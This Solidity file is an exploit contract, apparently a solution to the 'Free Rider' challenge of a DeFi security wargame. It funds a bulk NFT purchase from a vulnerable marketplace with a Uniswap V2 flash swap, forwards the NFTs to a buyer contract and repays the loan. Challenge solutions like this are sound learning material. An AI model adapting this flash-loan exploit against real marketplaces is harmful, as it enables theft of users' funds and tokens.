// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

//Importing OpenZeppelin's Onlyowner Implementation
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {IUniswapV2Pair} from "src/Contracts/free-rider/Interfaces.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {ERC721} from "openzeppelin-contracts/token/ERC721/ERC721.sol";
import "forge-std/console.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IFreeRiderNFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackerContract is Ownable, IERC721Receiver {
    using Address for address;

    error NotUniswapV2Pair(string message);

    IUniswapV2Pair private immutable uniswapV2Pair;
    IWETH private immutable weth;
    IFreeRiderNFTMarketplace private freeRiderNFTMarketplace;
    address private immutable freeRiderBuyer;
    address private immutable DVT_ADDRESS;

    constructor(
        address _uniswapV2Pair,
        address _weth,
        address _freeRiderNFTMarketplace,
        address _freeRiderBuyer,
        address _DVT_ADDRESS
    ) {
        require(_uniswapV2Pair.isContract(), "Not a contract address");
        require(_weth.isContract(), "Not a contract address");
        require(_freeRiderNFTMarketplace.isContract(), "Not a contract address");
        require(_freeRiderBuyer.isContract(), "Not a contract address");
        require(_DVT_ADDRESS.isContract(), "Not a contract address");

        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        weth = IWETH(_weth);
        freeRiderNFTMarketplace = IFreeRiderNFTMarketplace(_freeRiderNFTMarketplace);
        freeRiderBuyer = _freeRiderBuyer;
        DVT_ADDRESS = _DVT_ADDRESS;
    }

    function attack() public onlyOwner {
        address tokenA = uniswapV2Pair.token0();
        address tokenB = uniswapV2Pair.token1();
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        (uint256 amount0Out, uint256 amount1Out) = token0 == address(weth) ? (15 ether, uint256(0)) : (0, 15 ether);

        // 1. Call `uniswapV2Pair.swap` to take flash loan
        uniswapV2Pair.swap(amount0Out, amount1Out, address(this), new bytes(0xaaaa));

        // 2. withdraw eth from weth contract
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        if (msg.sender != address(uniswapV2Pair)) {
            revert NotUniswapV2Pair("Not uniswapV2Pair");
        }

        uint256 fee;
        if (_amount0 > 0) {
            fee = ((_amount0 * 3) / 997) + 1;
        }
        if (_amount1 > 0) {
            fee = ((_amount1 * 3) / 997) + 1;
        }

        weth.withdraw(15 ether);
        // 1. Call `freeRiderNFTMarketplace.buyMany` to buy all NFTs
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
        for (uint256 i = 0; i < 6; i++) {
            // 2. Transfer all NFTs to `freeRiderBuyer`
            ERC721(DVT_ADDRESS).safeTransferFrom(address(this), freeRiderBuyer, i);
        }
        // 3. deposit eth to weth contract
        uint256 amountToRepay;
        if (_amount0 > 0) {
            amountToRepay = _amount0 + fee;
        } else {
            amountToRepay = _amount1 + fee;
        }

        weth.deposit{value: amountToRepay}();
        // 4. Transfer weth to uniswapV2Pair with fee

        weth.transfer(address(uniswapV2Pair), amountToRepay);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function withdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {}
}
